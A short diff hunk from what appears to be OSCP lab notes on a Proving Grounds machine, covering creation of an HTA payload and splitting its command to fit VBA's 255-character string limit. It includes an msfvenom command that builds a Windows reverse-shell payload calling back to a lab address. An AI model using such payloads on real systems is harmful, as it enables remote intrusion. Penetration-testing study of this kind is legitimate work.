@@ -81,3 +81,8 @@ Creating a hta payload. We need to extract the command from it.
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.220 LPORT=80 -f hta-psh -o tmp.hta
 ```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Hepet/Hepet_2021.08.28_01h32m52s_001_.png)
+
+Because VBA's literal string can contain a maximum of 255 characters. So we have to separate the command string.
+
